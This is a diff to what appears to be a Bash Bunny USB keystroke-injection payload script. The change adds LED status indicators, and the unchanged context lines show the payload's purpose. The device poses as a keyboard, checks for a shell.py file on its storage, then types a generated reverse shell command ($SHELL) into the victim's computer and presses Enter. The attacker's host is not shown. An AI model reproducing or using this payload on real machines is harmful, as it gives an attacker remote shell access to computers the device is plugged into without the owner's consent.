@@ -9,6 +9,7 @@
 # PLEASE READ THE CONFIGUATION REQUIRMENTS INSIDE THE GITHUB REPO BEFORE RUNNING SCRIPT. 
 
 ATTACKMODE HID
+LED B # indicate payload started
 
 Q DELAY 1000 #Waiting for PC to recongize bunny. 
 
@@ -27,7 +28,8 @@ else
     Q DELAY 1000
     Q GUI
     Q DELAY 500
-    Q STRING "shell.py not found, make sure you have placed it inside of the UDisk :) " >&2 #Catch to make sure the user has shell.py on their bunny. 
+    Q STRING "shell.py not found, make sure you have placed it inside of the UDisk :) " >&2 #Catch to make sure the user has shell.py on their bunny.
+    LED R # indicate payload failed.
     exit 1
 fi
 
@@ -46,3 +48,4 @@ Q DELAY 2000
 Q STRING $SHELL # type out generated reverse shell. 
 Q DELAY 500
 Q ENTER
+LED G # indicate payload is done. 
